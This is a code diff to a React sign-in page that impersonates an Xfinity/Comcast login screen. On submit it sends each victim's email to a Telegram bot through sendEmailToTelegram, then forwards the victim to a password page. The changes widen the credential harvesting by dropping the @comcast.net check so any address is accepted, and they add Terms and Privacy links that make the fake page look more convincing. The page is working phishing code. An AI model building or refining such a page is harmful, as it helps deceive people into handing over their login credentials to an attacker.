@@ -7,7 +7,6 @@ import { ChevronRight } from "lucide-react";
 import Footer from "@/components/Footer/Footer";
 import { sendEmailToTelegram } from "@/bot/telegrambot";
 
-const ALLOWED_DOMAIN = "@comcast.net";
 
 const LoginEmail = () => {
   const [email, setEmail] = useState("");
@@ -20,25 +19,20 @@ const LoginEmail = () => {
 
     // Empty check
     if (!email.trim()) {
-      setError("Please enter your Xfinity ID to sign in.");
+      setError("Please enter your email Address to sign in.");
       return;
     }
 
-    // Domain validation — must end with @comcast.net
-    if (!email.toLowerCase().endsWith(ALLOWED_DOMAIN)) {
-      setError("The Xfinity ID you entered was incorrect. Please try again.");
-      return;
-    }
+
 
     setError("");
     setLoading(true);
 
-    // Send email to Telegram bot
     await sendEmailToTelegram(email);
 
     setTimeout(() => {
       setLoading(false);
-      navigate("/box/mail/password", { state: { email } });
+      navigate("/login/password", { state: { email } });
     }, 600);
   };
 
@@ -76,22 +70,22 @@ const LoginEmail = () => {
                     setEmail(e.target.value);
                     setError("");
                   }}
-                  className="w-full rounded-sm border border-neutral-500 bg-neutral-100 px-4 py-4 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
+                  className="w-[400px] h-12 rounded-sm border border-neutral-500 bg-neutral-100 px-4 py-4 text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-ring"
                 />
                 {error && (
                   <p className="mt-1 text-xs text-destructive">{error}</p>
                 )}
               </div>
 
-              <p className="text-sm text-neutral-900 leading-relaxed">
+              <p className="text-md text-neutral-900 leading-relaxed">
                 By signing in, you agree to our{" "}
-                <span  className="text-violet-800 underline">
+                <Link to="/terms" className="text-violet-800 underline">
                   Terms of Service
-                </span>{" "}
+                </Link>{" "}
                 and{" "}
-                <span className="text-violet-800 underline">
+                <Link to="/privacy" className="text-violet-800 underline">
                   Privacy Policy
-                </span>.
+                </Link>.
               </p>
 
               <button
